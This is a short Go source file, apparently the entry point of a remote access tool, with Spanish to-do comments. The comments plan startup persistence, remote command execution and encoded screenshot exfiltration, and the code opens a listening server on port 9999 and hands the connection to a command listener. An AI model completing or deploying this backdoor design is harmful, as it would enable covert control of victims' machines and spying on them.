package main

/*
1. fucnion mover al startup
2. implementar conexiones
3. implementar ejecucion de comandos y comunicacion
4 . screenshot y envio codificado
*/

import (
	"fmt"
	"os"
	"server/conexiones"
	ejec "server/ejecuciones"
)

const PUERTO = "9999"

func main() {
	ipv4, error := conexiones.Ipv4()
	if error != nil {
		fmt.Println("hubo un error: ", error)
		os.Exit(1)
	} else {
		conex, error := conexiones.Server(ipv4, PUERTO)
		if error != nil {
			os.Exit(1)
		}

		ejec.Escucha(conex)

	}
}
